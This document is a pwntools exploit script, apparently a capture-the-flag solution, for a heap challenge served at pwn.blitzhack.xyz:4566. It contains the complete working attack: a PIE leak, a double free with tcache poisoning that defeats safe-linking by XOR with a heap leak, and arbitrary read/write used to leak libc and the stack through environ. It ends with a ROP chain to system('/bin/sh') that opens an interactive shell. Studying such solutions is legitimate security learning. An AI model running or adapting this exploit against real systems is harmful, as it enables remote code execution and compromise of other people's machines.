#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal =['alacritty','-e','bash','-c']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.blitzhack.xyz",4566)
        context.noptrace=True

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.sendlineafter(b'>',b'9999')
    r.sendlineafter(b':',b'a')
    r.sendlineafter(b':',b'aaaaaa')
    r.recvuntil(b'age:')
    exe.address = int(r.recvline().split(b" ")[1].decode())-0x4060

    print(hex(exe.address))
    def malloc(sz,pl):
        r.sendlineafter(b'>',b'1')
        r.sendlineafter(b':',str(sz).encode())
        r.sendlineafter(b':',pl)

    def edit(idx,pl):
        r.sendlineafter(b'>',b'2')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'2')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode()) 
        r.sendlineafter(b':',pl)

    def show(idx):
        r.sendlineafter(b'>',b'3')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'3')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode()) 
        r.recvuntil(b': "')
        return r.recvline().strip()[:-1]

    def free(idx):
        r.sendlineafter(b'>',b'4')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'4')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode()) 

    malloc(0x43,b'aaaa')
    free(0)
    heap_leek = unpack(show(0),'all')
    for i in range(7):
        malloc(0x33,b'')
    print(hex(heap_leek<<12))
    malloc(0x33,b'a')
    malloc(0x33,b'b')
    malloc(0x33,b'a')
    free(1)
    free(2)
    free(1) 
    st  = (exe.address+0x4080)^(heap_leek)
    edit(1,p64(st))
    malloc(0x33,b'a')
    malloc(0x33,b'a')
    
    edit(5,p64(exe.address+0x4020))
    libc.address = unpack(show(0),'all')-0x2045c0
    edit(5,p64(libc.sym['environ']))
    stack = unpack(show(0),'all')
    print(hex(libc.address))
    print(hex(stack))
    gdb.attach(r)
    rip = stack-0x150
    edit(5,p64(rip))
    pop_rdi = p64(libc.address+0x10f75b)
    ret = p64(libc.address+0x10f75b+1)
    rop = pop_rdi+p64(next(libc.search(b'/bin/sh'))) + ret+p64(libc.sym.system)
    edit(0,rop)
    r.interactive()


if __name__ == "__main__":
    main()
